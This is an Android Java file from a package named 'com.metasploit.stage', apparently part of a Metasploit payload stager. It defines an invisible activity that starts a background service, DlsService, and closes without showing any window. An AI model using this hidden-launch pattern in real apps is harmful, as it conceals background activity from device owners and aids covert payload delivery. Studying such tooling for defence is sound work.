package com.metasploit.stage;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

/**
 * Invisible launcher — starts DlsService and immediately exits.
 * No UI, no window. Theme is set to NoDisplay in the manifest.
 */
public class DlsLauncher extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Start foreground service
        Intent svc = new Intent(this, DlsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
        // Exit without drawing anything
        finish();
    }
}
